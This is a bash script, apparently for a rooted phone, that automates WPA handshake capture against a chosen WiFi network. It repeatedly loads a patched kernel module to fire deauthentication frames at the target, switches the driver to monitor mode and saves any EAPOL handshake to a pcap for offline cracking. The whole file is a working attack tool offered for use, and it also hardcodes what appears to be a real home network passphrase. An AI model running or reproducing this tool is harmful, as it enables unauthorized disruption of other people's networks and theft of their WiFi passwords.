#!/bin/bash
# grab_multi.sh - Multi-target handshake capture
# Runs on the PHONE. Expects petx11.ko already patched & pushed for current target.
# Args: BSSID SSID FREQ ROUNDS CAPTURE_SEC
set -o pipefail

BSSID="$1"
SSID="$2"
FREQ="$3"
ROUNDS="${4:-5}"
CAPTURE_SEC="${5:-20}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID_24="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"
PAUSE_RMMOD=0.2

echo ""
echo "============================================"
echo " Target: $SSID ($BSSID)"
echo " Freq: $FREQ MHz"
echo " Rounds: $ROUNDS, Capture: ${CAPTURE_SEC}s/round"
echo "============================================"
echo ""

wait_wlan0() {
    for i in $(seq 1 100); do
        [ -e /sys/class/net/wlan0 ] && return 0
        sleep 0.05
    done
    return 1
}

cleanup() {
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null
    wait_wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID_24" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

BSSID_LOWER=$(echo "$BSSID" | tr 'A-F' 'a-f')

cat > /tmp/wpa_target_multi.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

rm -f /tmp/hs_multi_*.pcap
HANDSHAKE_FOUND=0

for round in $(seq 1 "$ROUNDS"); do
    echo "========== ROUND $round/$ROUNDS =========="

    # Load STA driver
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant tcpdump 2>/dev/null; sleep 0.2
    rmmod wlan 2>/dev/null; sleep 1
    insmod "$DRIVER"
    wait_wlan0 || { echo "  [!] wlan0 not found"; continue; }
    sleep 2
    ip link set wlan0 up; sleep 0.5

    # Connect to target
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    dmesg -C
    wpa_supplicant -i wlan0 -c /tmp/wpa_target_multi.conf -B -D nl80211 2>/dev/null

    PE_FOUND=0
    for w in $(seq 1 200); do
        if dmesg | tail -50 | grep -q "Connecting to"; then
            PE_FOUND=1; break
        fi
        sleep 0.05
    done

    if [ "$PE_FOUND" -eq 0 ]; then
        echo "  [-] No PE session, skipping"; killall wpa_supplicant 2>/dev/null; continue
    fi

    # Wait for TX power
    echo -n "  [*] TX power: "
    TXPWR="0.00"
    for tp in $(seq 1 100); do
        TXPWR=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        [ -n "$TXPWR" ] && [ "$TXPWR" != "0.00" ] && break
        sleep 0.1
    done
    echo "${TXPWR} dBm"

    # Fire deauths
    DEAUTH_OK=0
    echo -n "  [*] Deauths: "
    for f in $(seq 1 5); do
        dmesg -C
        insmod /tmp/petx11.ko 2>/dev/null
        if dmesg | grep -q "Deauth TX"; then
            DEAUTH_OK=$((DEAUTH_OK + 1)); echo -n "+"
        else
            echo -n "x"
        fi
        sleep 0.15
    done
    echo " ($DEAUTH_OK/5)"

    [ "$DEAUTH_OK" -eq 0 ] && { echo "  [-] No deauths"; killall wpa_supplicant 2>/dev/null; continue; }

    # Fast switch to monitor
    killall wpa_supplicant 2>/dev/null
    T0=$(date +%s%N)
    rmmod wlan; sleep "$PAUSE_RMMOD"
    insmod "$DRIVER" con_mode_monitor=4
    if ! wait_wlan0; then
        rmmod wlan 2>/dev/null; sleep 1
        insmod "$DRIVER" con_mode_monitor=4
        wait_wlan0 || { echo "  [!] Monitor failed"; continue; }
    fi
    ip link set wlan0 up
    iw dev wlan0 set freq "$FREQ"
    T1=$(date +%s%N)
    echo "  [*] Switch: $(( (T1-T0)/1000000 ))ms"

    # Capture
    PCAP="/tmp/hs_multi_${round}.pcap"
    timeout "$CAPTURE_SEC" tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
    TCPID=$!
    echo "  [*] Capturing ${CAPTURE_SEC}s..."
    wait $TCPID 2>/dev/null

    FSIZE=$(stat -c%s "$PCAP" 2>/dev/null || echo 0)
    EAPOL_COUNT=0
    [ "$FSIZE" -gt 24 ] && {
        EAPOL_COUNT=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        EAPOL_COUNT=$(echo "$EAPOL_COUNT" | tr -d '[:space:]')
        [ -z "$EAPOL_COUNT" ] && EAPOL_COUNT=0
    }

    echo "  [*] ${FSIZE}B, EAPOL: $EAPOL_COUNT"

    if [ "$EAPOL_COUNT" -gt 0 ]; then
        echo "  [!!!] EAPOL DETECTED!"
        cp "$PCAP" "/tmp/handshake_${BSSID_LOWER//:/}.pcap"
        HANDSHAKE_FOUND=1
        break
    fi
    echo ""
done

echo ""
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo "SUCCESS: /tmp/handshake_${BSSID_LOWER//:/}.pcap"
else
    echo "No handshake in $ROUNDS rounds for $SSID"
fi
exit $((1 - HANDSHAKE_FOUND))
